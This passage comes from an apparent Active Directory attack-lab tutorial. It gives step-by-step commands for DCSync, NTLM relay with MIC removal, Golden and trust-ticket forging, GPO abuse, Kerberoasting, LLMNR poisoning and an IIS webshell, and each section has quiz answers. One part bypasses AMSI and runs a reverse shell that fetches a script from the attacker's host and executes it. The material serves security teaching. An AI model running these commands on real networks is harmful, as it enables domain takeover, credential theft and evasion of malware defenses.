service ticket to its own service, on behalf of the Administrator. By having a ticket from the Administrator to its own service, Walter can then use the S4U2Proxy extension, which retrieves a service ticket in name of the Administrator (in this case) for the CIFS service in CAPTAIN, and use this ticket, impersonating the Administrator while accessing the CIFS service in CAPTAIN. All of this is possible since Walter is allowed to perform constrained delegation to the CIFS service in CAPTAIN.</p> <p>Question</p> <p>How can this attack be mitigated?</p> Answer <p>This attack can be mitigated by not configuring constrained delegation permissions from low-privileged accounts to sensitive services. This way, simply by compromising user accounts, an attacker shouldn't be able to access a service as the administrator. Delegation to sensitive services needs to be carefully planned and accounts that can delegate tickets to such services should be very well protected, to prevent these scenarios.</p>"},{"location":"labs/multi-domain-attacks/DCSync/","title":"DCSync","text":"<p>A DCSync attack is used for extracting domain secrets. An attacker can execute such an attack when it reaches domain admin privileges for example. Once this attack is executed, an attacker will hold every domain account credential, having fully compromised the domain.</p> <p>To execute this attack, you can use the Administrator password, supposedly retrieved in the LLMNR poisoning attack, and the 'secretsdump.py' Impacket script: <pre><code>secretsdump.py -just-dc Administrator:Passw0rd@captain.north.altair.local\n</code></pre></p> <p>And just like that, you've compromised the north.altair.local domain.</p> <p>Question</p> <p>Is the Administrator password required to DCSync?</p> Answer <p>No. Any principal with the Replicating Directory Changes/Replicating Directory Changes All extended rights can DCSync.</p> <p>Question</p> <p>What kinds of credentials are retrieved through a DCSync attack?</p> Answer <p>NTLM password hashes, Kerberos long-term keys, and entries for users and machine accounts (such as  CAPTAIN$ and krbtgt). No cleartext passwords are retrieved.</p> <p>Question</p> <p>What does the krbtgt account represent and what can an attacker do with its credentials?</p> Answer <p>The krbtgt account is the built-in account the domain\u2019s KDC uses to sign and encrypt TGTs. If an attacker gets its credentials, they can forge Golden Tickets to impersonate any user and request any service tickets at will.</p>"},{"location":"labs/multi-domain-attacks/DropTheMIC/","title":"Drop the MIC attack","text":"<p>This attack targets the NTLM protocol. It also relays authentication from a legitimate client to a legitimate server, but this time, the messages no longer target the SMB service, but the LDAPS service. LDAPS can be used to alter the AD database and doesn't enforce singing by default on DCs, contrary to the SMB service. The attacker hijacks NTLM authentication messages being sent to access an SMB service, and alters them to access LDAPS instead. In order to do so, they must remove the Message Integrity Code (MIC) from NTLM messages. Hence the attack's name.</p> <p>This attack also makes use of two different terminals, just like the NTLM relay attack. This attack will relay authentication from the MEMBER machine to the CAPTAIN machine, and use it to create a new computer account, as well as grant this new computer account RBCD privileges to MEMBER, which means that the new computer account can impersonate any user to access any service provided by the MEMBER machine, essentially compromising it.</p> <p>First, in one terminal run: <pre><code>ntlmrelayx.py -t ldaps://captain.north.altair.local --remove-mic --add-computer removemiccomputer --delegate-access \n</code></pre></p> <p>This script will relay NTLM messages that are originally meant for an SMB service to the LDAPS service from the MEMBER machine to the CAPTAIN machine, and automatically create the new computer account and grant it RBCD privileges in MEMBER.</p> <p>In a second terminal, run: <pre><code>#in the krbrelayx dir\npython3 printerbug.py NORTH/skyler.white:Password123@192.168.122.5 192.168.122.2 \n</code></pre> This script uses the printer bug in order to coerce authentication from the MEMBER machine to the attacker's machine, allowing the attacker to relay MEMBER's NTLM messages to LDAPS in the DC.</p> <p>Take note of the newly created computer account on the ntlmrelayx script output. You can now use this account to impersonate the Administrator to a MEMBER machine service, as per RBCD normal behavior:</p> <pre><code>getST.py -dc-ip 192.168.122.10 -impersonate Administrator -spn cifs/member.north.altair.local north/removemiccomputer\\$:'&lt;passwordfromntlmscript&gt;'\n#set the KRB5CCNAME environment variable to the new ticket\nexport KRB5CCNAME=/your/current/directory/Administrator.ccache\n#now you can access the SMB service as the Administrator user on MEMBER\npsexec.py -k -no-pass member.north.altair.local\nwhoami\n</code></pre> <p>Question</p> <p>What's the purpose of targetting the LDAPS service instead of the SMB service in this attack?</p> Answer <p>The LDAPS does not enforce signing by default, in contrary to SMB. Removing the MIC while using a service that enforces signing won't work. That's why the LDAPS service is targetted in this attack.</p> <p>Question</p> <p>Why can we configure the newly computer account with RBCD privileges against the MEMBER machine?</p> Answer <p>We can configure RBCD in this manner since we're using an authenticated MEMBER connection, which can configure RBCD related to itself (Resource-Based Constrained Delegation).</p>"},{"location":"labs/multi-domain-attacks/ForestTrustsAttack/","title":"Attacking Forest Trusts","text":"<p>In this attack, we'll target an inter-forest trust relationship: The Forest trust between the sirius and altair domains. An SID injection attack won't work by default on these trusts, since SID Filtering is enabled. What can work is, for example, Unconstrained Delegation Abuse.</p> <p>We've tackled this attack on the Unconstrained Delegation Abuse section. This time, we'll use CHIEF as the compromised service account, and KING as the victim. DC's are both allowed for unconstrained delegation and allow their account to be delegated through delegation mechanisms in Kerberos. Also, in order for this attack to work, the forest trust must allow Kerberos tickets to be delegated, as well as being a bidirectional trust relationship. One-way forest trusts, or forest trusts that do not allow ticket delegation cannot be attacked in this manner. </p> <p>Through the use of the ldeep tool, we understand that delegation is enabled in the forest trust, due to the presence of the CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION flag in the trustAttributes attribute. We can also determine that the trust is bidirectional. We can check again: <pre><code>ldeep ldap -u skyler.white -p 'Password123' -d north.altair.local -s ldap://192.168.122.30 trusts\n</code></pre></p> <p>Let's then setup the Unconstrained delegation abuse scenario. First, we'll access the CHIEF machine as an Administrator (we've already compromised it on Trustpocalypse for example) through the wmiexec.py script. Then we'll create a new SPN as well as a DNS record resolving the SPN\u2019s hostname to the attacker\u2019s IP. <pre><code>#remember to use the hashes from your own environment, this is just an example.\n#the wmiexec.py script allows the attacker to issue commands to the target machine\nwmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86 -no-pass ALTAIR/Administrator@chief.altair.local\n#create an SPN record\npowershell -Command \"SetSPN -A HOST/attackingforest.altair.local CHIEF$\"\n#check the newly created SPN\npowershell -Command \"SetSPN -L CHIEF$\" \n#create a DNS record for the SPN that points to the attacker's machine\npowershell -Command \"Add-DnsServerResourceRecordA -Name \"attackingforest\" -ZoneName \"altair.local\" -IPv4Address 192.168.122.2 -TimeToLive 01:00:00\"\n#check DNS record\npowershell -Command \"nslookup attackingforest.altair.local\"\n</code></pre></p> <p>Now there\u2019s an SPN associated to the CHIEF domain controller, which resolves to the attacker's machine due to the DNS record. This will be how we\u2019ll trick the KING domain controller to send us its TGT. It is supposedly authenticating to a service pertaining to the CHIEF domain controller, thus it sends its TGT to the service (since CHIEF's configured for unconstrained delegation). Then, it will resolve the SPN through DNS, and end up sending the TGT to the attacker\u2019s machine.</p> <p>What's left for the attacker to do is to coerce KING authentication, using the printer bug, and extract KING's TGT from Kerberos messages. Once the attacker holds this TGT, the sirius domain can then be compromised, since the attacker can impersonate the KING DC.</p> <pre><code>#retrieve CHIEF's aes key that will be used to cipher the TGT sent by KING\n#the kerberos ticket used here was retrieved in the Trustpocalypse attack. Please execute that attack first.\nsecretsdump.py -k -no-pass berntheman@chief.altair.local\n#[+]ALTAIR\\CHIEF$:aad3b435b51404eeaad3b435b51404ee:143b50cff65b459efa236693abbb4017:::\n#[+]CHIEF$:aes256-cts-hmac-sha1-96:edeb40f907993b6316c58d7a723bd69035ce635dd52f22abb5892daa700df615\n#now let's start krbrelayx script. We'll have to stop the DNS service in our machine, the script will need to use that port\n#remember that the hash values may differ. Use your own hash values.\n\n#in one terminal\n#navigate to the krbrelayx directory\nsystemctl stop systemd-resolved \n#use CHIEF$:aes256-cts-hmac-sha1-96 value here\nsudo -E python3 krbrelayx.py -aesKey edeb40f907993b6316c58d7a723bd69035ce635dd52f22abb5892daa700df615\n\n#now, trigger the printer bug from a different terminal\n#use CHIEF hash values here, which you can also retrieve from the secretsdump script output\npython3 printerbug.py --verbose -hashes aad3b435b51404eeaad3b435b51404ee:143b50cff65b459efa236693abbb4017 altair.local/CHIEF\\$@king.sirius.local attackingforest.altair.local\n\n#in the end we can turn DNS on our machine on again\nsystemctl start systemd-resolved \n</code></pre> <p>And there it is, the krbrelayx script has retrieved KING's TGT! By stealing KING\u2019s TGT, the attacker can now impersonate the Domain Controller of the sirius domain, allowing full compromise of sirius through tools like secretsdump.</p> <pre><code>export KRB5CCNAME=/home/ubuntu/krbrelayx/KING\\$@SIRIUS.LOCAL_krbtgt@SIRIUS.LOCAL.ccache\nsecretsdump.py -k -no-pass -just-dc-ntlm sirius.local/KING\\$@KING.sirius.local\n</code></pre> <p>Note: The SPN has to be correctly set in the CHIEF domain controller before triggering authentication and stealing the TGT. Sometimes the SPN disappears for some reason. If you\u2019re having trouble retrieving the ticket with krbrelayx (like NTLM being used instead of Kerberos), make sure the SPN is well set. I recommend to get familiar with the commands first, then, set the SPN through the wmiexec.py script and quicly start krbrelayx and trigger the printerbug. If you\u2019re quick enough you can definitely get the ticket. </p> <p>Question</p> <p>Why can't the attacker use SID injection in this forest trust attack?</p> Answer <p>Because SID Filtering is enabled by default in forest trusts, extra SIDs like the Enterprise Admin SID would be stripped from the ticket, making SID injection attacks ineffective.</p> <p>Question</p> <p>What conditions must be met for this unconstrained delegation attack to succeed?</p> Answer <p>The forest trust must be bidirectional, allow Kerberos delegation across the trust, and the CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION flag must be set. Also, the compromised machine (CHIEF) must have unconstrained delegation enabled, which DCs do by default, and the attacker must be able to coerce authentication from a DC in the other forest.</p> <p>Question</p> <p>What's krbrelayx.py role in this attack?</p> Answer <p>krbrelayx.py listens for incoming Kerberos authentication, intercepts the TGT sent by the victim DC (KING), decrypts it using the known AES key of CHIEF, and saves it for reuse, allowing the attacker to impersonate KING and compromise the sirius domain.</p> <p>Question</p> <p>Could the attacker, from CAPTAIN, use this attack to compromise CHIEF, instead of the SID-injection attack from Trustpocalypse section?</p> Answer <p>Yes, this attack could also be perpetrated from CAPTAIN to CHIEF, given that they are both DCs, thus allowing this unconstrained delegation abuse attack to happen as well. This attack could be done if for example, the trust between north and altair had SID-filtering enabled.</p>"},{"location":"labs/multi-domain-attacks/ForgingTrustTickets/","title":"Forging Trust Tickets","text":"<p>Earlier, we've performed the Trustpocalypse attack, which forges a TGT with an injected SID: The EAs SID. This TGT is then sent to the CAPTAIN, CAPTAIN will create a Trust Ticket, or an Inter-Realm Ticket, and forward this ticket to the CHIEF DC. This Trust Ticket is encrypted using the trust key, rather than with the krbtgt's key.</p> <p>In this attack, we'll cut to the chase and forge the trust ticket itself using the trust key. Instead of forging a TGT and letting the trusted DC (CAPTAIN) generate the inter-realm ticket, we now forge the inter-realm ticket ourselves using the trust key (ALTAIR$). This allows direct access to services in the trusting domain (ALTAIR) without relying on CAPTAIN. We'll follow the same steps as in the Trustpocalypse attack. This attack helps further understanding how cross domain authentication is processed from an attacker's point of view. The end result of this attack is the same as the Trustpocalypse attack.</p> <pre><code>#retrieve the ALTAIR$ password hash, the trust account present in CAPTAIN\n#remember to use your own hashes from your environment, they might be different\nsecretsdump.py north.altair.local/administrator@192.168.122.10 -hashes aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86\n#[+] ALTAIR$:1103:aad3b435b51404eeaad3b435b51404ee:5c637c666075bc3fe4ba6d5688536cc1:::\n#forge a referral ticket\nticketer.py -nthash 5c637c666075bc3fe4ba6d5688536cc1 -domain-sid S-1-5-21-1162943719-2261011477-1519509434 -domain north.altair.local -extra-sid S-1-5-21-1073456172-1737515156-949376640-519 -spn krbtgt/altair.local berntheman\nexport KRB5CCNAME=/home/ubuntu/berntheman.ccache\n#use the interrealm ticket to get a service ticket to the cifs/smb service with EA privileges\ngetST.py -k -no-pass -spn cifs/chief.altair.local altair.local/berntheman@altair.local -debug\n#compromise the altair domain\nexport KRB5CCNAME=/home/ubuntu/berntheman@altair.local@cifs_chief.altair.local@ALTAIR.LOCAL.ccache\nsecretsdump.py -k -no-pass -just-dc-ntlm berntheman@chief.altair.local\n</code></pre> <p>Done! This is a different way of forging a ticket that compromises trusting domains!</p> <p>Question</p> <p>What's the difference between this and the Trustpocalypse attack?</p> Answer <p>In Trustpocalypse, the attacker forges a TGT and lets the trusted DC create the trust ticket. In this attack, the attacker forges the trust ticket directly using the trust key, bypassing the trusted DC.</p> <p>Question</p> <p>Would SID Filtering mitigate this attack?</p> Answer <p>Yes, SIDs from different domains would still be filtered when authenticating to the altair domain, which would render this attack useless.</p> <p>Question</p> <p>What role does the trust key have play in cross-domain authentication?</p> Answer <p>The trust key is used to encrypt and sign trust tickets issued by the trusted domain, proving their validity to the trusting domain. Through the use of a trust key, the trusting domain can determine if the ticket is actually sent from a trusted domain, since trust keys are agreed between trusted and trusting domains upon trust relationship establishment.</p>"},{"location":"labs/multi-domain-attacks/GPOabuse/","title":"GPO Abuse","text":"<p>While performing the ACL abuse attack (please do), you might have noticed that the Hank user account has 'GenericAll' access rights over a GPO, through the use of the BloodHound tool. Group Policy Objects (GPOs) are used to enforce specific settings across Organizational Units in AD. These range from critical configurations,  such as such as logon scripts, startup commands, software deployment, registry edits, and even scheduled tasks, all of which are executed with SYSTEM privileges on the targeted machines.</p> <p>GPOs can also be used for more 'futile' reasons, such as setting wall papers across every computer. It seems that this is the case in our environment, as we can see through the BloodHound GUI by using the Cypher query specified in the ACL section.</p> <p>Since we've compromised Hank's account in the ACL attack, let's use it to abuse the GPO. As aforementioned, GPOs can create scheduled tasks that run under the SYSTEM security context. As the attacker, we can create a scheduled task leveraging the 'GenericAll' access right that Hank holds on the GPO, and for example, create a new user and add it to the Domain Admins group!</p> <p>We'll use the pyGPOabuse.py script, which automates this process. We'll use Hank's TGT, which you can retrieve by executing the Shadow Credentials attack, as specified in the ACLs section. You'll also need to retrieve the GPO's ID, which can be done through the BloodHound GUI. Click the GPO's node and look at the GPO's Distinguished Name on the right. That's where you'll get its ID. <pre><code>#replace the GPO ID with the one present in your BloodHound GUI, place the hank.schrader.ccache file in the pyGPOAbuse dir, set the KRB5CCNAME var to the .ccache file, and from there run:\npython3 pygpoabuse.py -k -ccache hank.schrader.ccache north.altair.local/hank.schrader -gpo-id B2DBE2C2-9880-444B-A950-97072C096554 -dc-ip captain.north.altair.local\n</code></pre></p> <p>You can execute the command \"gpupdate /force\" as the Administrator on CAPTAIN or wait for a while in order for the GPO to run the scheduled task. After the task is executed, a user account named \u201cjohn\u201d and with password \u201cH4x00r123..\u201d will exist in the domain and be part of the Domain Admins group. We can confirm if the account is active with crackmapexec, as well as dump domain secrets with this new account.</p> <pre><code>#confirm that the account exists\ncrackmapexec smb 192.168.122.10 -u john -d north.altair.local -p H4x00r123..\n#dump domain secrets\nsecretsdump.py john:H4x00r123..@captain.north.altair.local\n</code></pre> <p>Question</p> <p>What is a Group Policy Object and what is its purpose in an Active Directory environment?</p> <p>??? \"success\" Answer     A Group Policy Object (GPO) is a collection of policy settings that can be applied in AD. They're used to enforce specific configurations across users and computers within a domain. Its purpose is to centralize the management of settings. GPOs can apply to Organizational Units (OUs), domains, or sites, allowing administrators to control environments automatically.</p> <p>Question</p> <p>What types of critical configurations can be applied through GPOs?</p> <p>??? \"success\" Answer     GPOs can enforce a wide range of critical configurations, including logon and logoff scripts, startup and shutdown commands, software deployment, registry modifications, and security policies (such as password requirements and account lockouts).</p> <p>Question</p> <p>How can you identify that a user has permissions over a GPO in BloodHound?</p> <p>??? \"success\" Answer     In BloodHound, you can identify GPO permissions by running specific Cypher queries in the GUI. When analyzing a user node like Hank, you can check if they have access rights such as GenericAll, WriteDacl, or WriteOwner over a GPO object. This appears in the relationship graph, as the link between the GPO and Hank's node.</p>"},{"location":"labs/multi-domain-attacks/GoldenTickets/","title":"Golden Tickets","text":"<p>Golden Tickets are a persistence attack in AD. They consist of TGTs that are forged by the attacker using the krbtgt's account hash, which is its secret use to create TGTs. If the attacker can retrieve this account's hash, the attacker can therefore forge a Kerberos TGT for any user with arbitrary information. Using this forged ticket, the attacker can then access domain services however he likes.</p> <p>In order to retrieve the krbtgt's hash value, you'll need admin access to the domain. This can be achieved by performing previous attacks in this lab such as the ACL Abuse attack, the SAMAccountName spoofing attack, the NTLM relay to SMB attack, and more. If for some reason you weren't able to retrieve the administrator's hash values, run the following command, and take note of the hash value.</p> <pre><code>secretsdump.py -just-dc-user 'Administrator' north.altair.local/Administrator:Passw0rd@192.168.122.10 \n</code></pre> <p>To forge a Golden Ticket: <pre><code>#retrieve the north.altair.local domain's SID\nlookupsid.py -no-pass -hashes &lt;admin:hashes&gt; -domain-sids north.altair.local/Administrator@192.168.122.10 0\n#get the krbtgt account hash\nsecretsdump.py -just-dc-user 'krbtgt' north.altair.local/administrator@192.168.122.10 -hashes &lt;admin:hashes&gt;\n#example output\n#[+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:640464e963ce78864650de778a6b9c31:::\n#in the command below, you must use the NT hash, which in the example output i gave you, is the second value (640464e963ce78864650de778a6b9c31)\nticketer.py -nthash &lt;krbtgt's NTHash&gt; -domain-sid &lt;domain SID&gt; -domain north.altair.local Administrator\n#At this point you've crafted a golden ticket, a TGT referencing the administrator account, which can be used to access any service in the domain as the administrator, for a long period of time\nexport KRB5CCNAME=/your/dir/Administrator.ccache\n#Create a shell session using the forged ticket with administrator permissions\nwmiexec.py -k -no-pass north.altair.local/Administrator@captain.north.altair.local\nwhoami\n</code></pre></p> <p>Question</p> <p>What is a Golden Ticket in Active Directory?</p> Answer <p>A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the krbtgt account\u2019s NT hash. With it, an attacker can impersonate any user, including Domain Admins, and access domain resources at will.</p> <p>Question</p> <p>Why is the krbtgt account hash required to forge a Golden Ticket?</p> Answer <p>The krbtgt account hash is the secret key the KDC uses to sign and validate TGTs. If an attacker has this hash, they can generate valid TGTs that the KDC will accept as legitimate.</p> <p>Question</p> <p>How can an attacker retrieve the krbtgt account hash?</p> Answer <p>The attacker needs domain admin\u2013level access to dump the krbtgt account credentials. This can be achieved through other attacks such as ACL abuse, SAMAccountName spoofing or NTLM relay to SMB.</p>"},{"location":"labs/multi-domain-attacks/IIS/","title":"IIS Misconfiguration Abuse","text":"<p>The Internet Information Services (IIS) is Microsoft's web server software, used to host websites, web applications, and more. If there are vulnerable endpoints hosted through IIS, an attacker may exploit the service, reaching for example, Remote Command Execution.</p> <p>In the Network Reconnaissance section of the lab, we've determined that there's an HTTP endpoint served at CAPTAIN called \"Simple Uploader\". Maybe it is a vulnerable endpoint. At first glance this endpoint allows users to upload arbitrary files to the DC through HTTP. If uploaded files can be accessed through HTTP as well, it presents a dangerous situation for the domain. If an attacker can upload a file and then access it through HTTP, the attacker can upload for example a webshell, and use it to run commands remotely. Let's take a look:</p> <pre><code>curl -X GET http://192.168.122.10\n</code></pre> <p>This confirms that we can upload files to this endpoint, it seems. Let's then upload the 'webshell.aspx' file, present in the webshell directory: <pre><code>#in the webshell directory\ncurl -X POST http://192.168.122.10 -F \"file=@webshell.aspx\"\n</code></pre></p> <p>Now, let's try and access the file we've just uploaded. Maybe it's saved on a folder named 'upload'? <pre><code>curl -X GET http://192.168.122.10/upload/webshell.aspx\n</code></pre></p> <p>Yes! We can access our webshell! Now we can execute commands through HTTP. Let's try it: <pre><code>curl -X POST http://192.168.122.10/upload/webshell.aspx -d \"param=whoami\"\n</code></pre></p> <p>This way, we've reached remote command execution at the DC under the the context of the IIS Application Pool Identity (IIS APPPOOL\\DefaultAppPool), which is the account IIS assigns to isolate each web application.</p> <p>Question</p> <p>What has the attacker compromised in this attack?</p> Answer <p>The attacker has gained remote command execution on the Domain Controller (DC) through a vulnerable IIS web application that allows file uploads and HTTP access to uploaded files. By uploading a webshell and accessing it via HTTP, the attacker can now execute commands on the server under the security context of the IIS Application Pool Identity. At this point, the domain hasn't been compromised. </p>"},{"location":"labs/multi-domain-attacks/Kerberoasting/","title":"Kerberoasting","text":"<p>This attack is similar to AS-REP roasting. In AS-REP roasting, the attacker retrieves a user's TGT through an AS-REP message since this user does not require Kerberos pre-authentication. In this case, the attacker will retrieve a TGS for a determined service and crack the service's account password offline, since TGSs are encrypted using the service's account password, like how AS-REP encrypted sections are encrypted using user account passwords.</p> <p>The target of a Kerberoasting attacks are user accounts with an associated SPN. Regular service accounts, such as accounts used by IIS or MSSQL services have long, random passwords that change regularly. User accounts with an associated SPN, however, may have common passwords that are relatively easy to crack, thus being the preferable targets for this attack.</p> <p>First, the attacker will then look for user accounts that have an associated SPN using Impacket, for example:</p> <pre><code>GetUserSPNs.py -dc-ip 192.168.122.10 north.altair.local/skyler.white:Password123 -outputfile kerberoasting.hashes\n</code></pre> <p>It seems that we were able to retrieve 3 TGS from 3 different user accounts with an associated SPN: walter.white, saul.goodman, and jesse.pinkman. At this point, we've already uncovered Jesse (AS-REP Roasting) and Saul's (Password in description) passwords. Let's focus on Walter's. With a TGS for Walter's service, we can use hashcat along with passwords.txt once again, to crack its password:</p> <pre><code>#remember hashcat and GNS3 VMs aren't friends, i suggest you install hashcat on your machine.\nhashcat -m 13100 kerberoasting.hashes ./passwords.txt --force --quiet\n</code></pre> <p>Question</p> <p>Can this attack be perpetrated against any account in AD?</p> Answer <p>No, this attack can only be perpetrated against service accounts. Preferebly, user accounts with an associated SPN.</p> <p>Question</p> <p>Does the attacker need user credentials to perpetrate this attack?</p> Answer <p>Yes, the attacker needs to be able to request a TGS to access the target service account. This can only be done by first authenticating as some other account, requiring credential access.</p>"},{"location":"labs/multi-domain-attacks/LDAPDump/","title":"Authenticated AD Reconnaissance","text":"<p>Once the attacker gains a foothold on a domain, by having acquired some user credentials, there's a wide-range of information an attacker can access.</p> <p>For example, the attacker can now retrieve every other user account in the domain: <pre><code>#north.altair.local\nGetADUsers.py -all north.altair.local/skyler.white:Password123 -dc-host CAPTAIN\n#sirius.local\nGetADUsers.py -all sirius.local/pam.beesly:IDontKnow? -dc-host KING\n#altair.local\nGetADUsers.py -all altair.local/lily.aldrin:ThisIsMyPassword123 -dc-host CHIEF\n</code></pre></p> <p>Other than users, the attacker can assess trust relationships established between the different domains: <pre><code>ldeep ldap -u skyler.white -p 'Password123' -d north.altair.local -s ldap://192.168.122.10 trusts\nldeep ldap -u skyler.white -p 'Password123' -d north.altair.local -s ldap://192.168.122.20 trusts\nldeep ldap -u skyler.white -p 'Password123' -d north.altair.local -s ldap://192.168.122.30 trusts\n</code></pre></p> <p>Through tools like ldapsearch, it's possible to issue direct LDAP queries against the directory without relying on higher-level scripts or wrappers. <pre><code>#obtain information on all users\nldapsearch -H ldap://192.168.122.10 -D 'skyler.white@north.altair.local' -w Password123 -b 'DC=north,DC=altair,DC=local' '(&amp;(objectCategory=person)(objectClass=user))'\n#List all AS-REP roastable users\nldapsearch -H ldap://192.168.122.10 -D 'skyler.white@north.altair.local' -w Password123 -b 'DC=north,DC=altair,DC=local' '(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'\n#List all Kerberoastable users\nldapsearch -H ldap://192.168.122.10 -D 'skyler.white@north.altair.local' -w Password123 -b 'DC=north,DC=altair,DC=local' '(&amp;(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))'\n#Retrieve GPO information\nldapsearch -H ldap://192.168.122.10 -D 'skyler.white@north.altair.local' -w Password123 -b 'CN=Policies,CN=System,DC=north,DC=altair,DC=local' '(objectClass=groupPolicyContainer)'\n</code></pre></p> <p>Many other types of information can be retrieved via LDAP using only low-privileged, valid credentials. LDAP serves as a core data source for auditing and reconnaissance in AD environments. Tools designed for AD security assessments rely on LDAP to collect details about users, group memberships, ACLs, computer objects, GPOs, trust relationships, and more. This makes LDAP a powerful resource for mapping out and auditing the entire domain structure.</p> <p>An attacker with authenticated access to AD can also check file shares. With new credentials, the attacker might have access to different shares, which may contain information on the AD environment.</p> <p><pre><code>crackmapexec smb 192.168.122.10 -u 'skyler.white' -p 'Password123' --shares\n</code></pre> With skyler's credentials, we have access to new shares! Let's take a peak.</p> <p><pre><code>smbclient //192.168.122.10/ImportantNotes -U 'skyler.white'\n#Enter 'Password123' when the password is requested\nls \nget note.txt\nexit\ncat note.txt\n</code></pre> Seems like there's an Holly Flax person from Human Resources. She's from SIRIUS domain, so this account might have access to sensitive employee information, as well as cross-domain presence. A valuable target for an attacker...</p> <p>Question</p> <p>How useful are LDAP queries to attackers and what do they require? </p> Answer <p>LDAP queries are very useful for attackers. They allow an attacker to enumerate users and groups, identify attack targets (AS-REP roastable and Kerberoastable accounts), dicover trust relationships, and more. To access LDAP and issue queries, an attacker needs valid account credentials. Even low-privileged credentials are enough as by default most directory information in Active Directory can be read by any authenticated user.</p> <p>Question</p> <p>Could you retrieve new usernames? What attacks can now be used in order to uncover their passwords?</p> Answer <p>Yes, new users were uncovered. With the usernames, the attacker can now try Password Spraying, AS-REP roasting, or Kerberoasting attacks to potentially retrieve new passwords.</p> <p>Question</p> <p>Which trusts are established in this environment?</p> Answer <p>There's a parent-child trust relationship between north and altair, and a forest trust relationship between altair and sirius. Since the mentioned trusts are transitive, the north domain transitively trusts sirius and vice-versa.</p>"},{"location":"labs/multi-domain-attacks/LLMNR-poisoning/","title":"LLMNR poisoning","text":"<p>The objective of this attack is to trick a client into authenticating to an attacker machine through means of LLMNR poisoning. LLMNR is a hostname resolution protocol used in AD as a fallback when DNS name resolution fails. It works by sending multicast requests to machines in the same network, asking for the hostname's IP address that DNS failed to provide.</p> <p>This can occur when, for example, a user mistypes some server name. If a user for example tries to access a server named \"CHIEF\", but insteads tries to access a server named \"CHIWF\" by mistake, the DNS won't be able to resolve this hostname, and thus LLMNR is triggered. Attackers then can take advantage of this mistake, and reply to the client indicating that the \"CHIWF\" hostname resolves to the attacker's own IP address. This way, the client is tricked into authenticating to the attacker's machine.</p> <p>In order to listen for LLMNR requests and poison them, the 'Responder' tool can be used. In the Responder directory, run: <pre><code>sudo -E python3 Responder.py -I ens3\n</code></pre></p> <p>Now, wait for some client to look for a server that doesn't exist. We've heard that Hank and the Administrator like to write super fast, maybe they'll both press the wrong key when accessing some server. Once you've captured the hashes, save them to a file named \"responder.hashes\" and using the NTLMHashCracking.txt file, conduct a password cracking attempt with Hashcat:</p> <pre><code>#Remember, GNS3 VMs and hashcat don't get along. I suggest installing hashcat on your machine\nhashcat -m 5600 --force -a 0 responder.hashes NTLMHashCracking.txt --quiet\n</code></pre> <p>If you're lucky, you might crack some password.</p> <p>Question</p> <p>Can the attacker perform this attack without user credentials? Why?</p> Answer <p>Yes, since LLMNR requests are sent to the network. Attackers can listen to these requests and simply send spoofed replies without needing credentials.</p> <p>Question</p> <p>How can the attacker crack the password? Keep in mind how the NTLM authentication is conducted and what is exchanged between client and server.</p> Answer <p>The attacker might be able to crack the password since the attacker conducts the NTLM authentication process with the victim. This results in the attacker having knowledge of both the challenge and the response used to authenticate the client. Thus, the attacker will know both the plaintext nonce as well as the hashed nonce, being able to conduct an offline dicionary attack to recover the victim's plaintext password. The attacker will use different passwords and use them to hash the plaintext nonce. If the hashed value is equal to the hashed nonce sent by the client, the attacker has successfully cracked the user's password.</p>"},{"location":"labs/multi-domain-attacks/LocalPrivilegeEscalation/","title":"Local Privilege Escalation","text":"<p>In this attack, we'll leverage remote command execution under a service account security context to compromise the Domain Controller locally. To reach remote command execution position perform the IIS abuse attack, also present in this lab.</p> <p>Once the attacker achieves remote command execution under the IIS service Application Pool Identity, the next objective is to establish a reverse shell. This is because the uploaded webshell can only run single, stateless commands. It does not maintain a persistent session. To gain more control and flexibility, the attacker needs to spawn a reverse shell that allows interactive command execution and session management.</p> <p>To do so, run the following: <pre><code>#in the webshell directory\npython3 reverse_shell_command.py 192.168.122.2 4444\n</code></pre></p> <p>This script outputs a powershell command encoded in B64, for obfuscation and to prevent special character issues. The command will initiate a TCP connection from the machine running the command to port 4444 at IP 192.168.122.2 (the attacker), and listen for powershell commands.</p> <p>We can get the output from the command, and send it to our webshell endpoint. Before doing so, we'll use netcat to start listening for a connection in port 4444 of the attacker machine. <pre><code>#in the attacker2 terminal\nnc -nlvp 4444\n#in the attacker terminal\ncurl -X POST http://192.168.122.10/upload/webshell.aspx --data-urlencode \"param=&lt;output from reverse_shell_command.py&gt;\"\n</code></pre></p> <p>At this point, you've supposedly received a connection in port 4444, meaning the reverse shell has been set up and now you can run commands on a single persistent session, instead of running stateless commands.</p> <p>The attacker's objective will be to run a mallicious script that uses service account privileges to reach SYSTEM privileges. To be able to run mallicious scripts, AMSI must be bypassed. Anti-Malware Scan Interface scans scripts before execution and prevents it if they're suspicious. AMSI also prevents certain well-known scritps from running. Take a look:</p> <pre><code>Invoke-Mimikatz\necho $Error[0].Exception.Message\n</code></pre> <p>The error message tells us that this script can't be run due to mallicious content. Let's try and bypass AMSI in the current powershell process to see if anything different happens: <pre><code>$w=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\n$f=$w.GetField('amsiInitFailed','NonPublic,Static');\n$f.SetValue($null,$true)\n\nInvoke-Mimikatz\necho $Error[0].Exception.Message\n</code></pre></p> <p>This time, we've set the amsiInitFailed flag to true, which indicates powershell that AMSI has failed. Now, powershell won't call AMSI since it has supposedly failed. If you try to run Invoke-Mimikatz again, you'll now get a different error, indicating that there's no such cmdlet, meaning that the AMSI has been bypassed in this session.</p> <p>Now, the attacker's objective is to bypass AMSI at the .NET level. At this point, the AMSI has been bypassed in the current Powershell session, but the mallicious script we wish to use down the line uses other AMSI-aware processes, namely, C# executables. If we don't bypass AMSI at the .NET level, AMSI will stop our mallicious script from executing.</p> <p>To bypass AMSI at the .NET level, we'll use 'amsi-net-bypass.txt', present in the webshell directory. <pre><code>#In the Attacker terminal\npython3 -m http.server 8081\n#In the Attacker2 terminal\n(new-object system.net.webclient).downloadstring('http://192.168.122.2:8081/amsi-net-bypass.txt')|IEX\n</code></pre> This way, we've loaded the 'amsi-net-bypass.txt' into memory and executed it. It should output 'True', meaning that it worked. Important to notice that we've loaded the script into 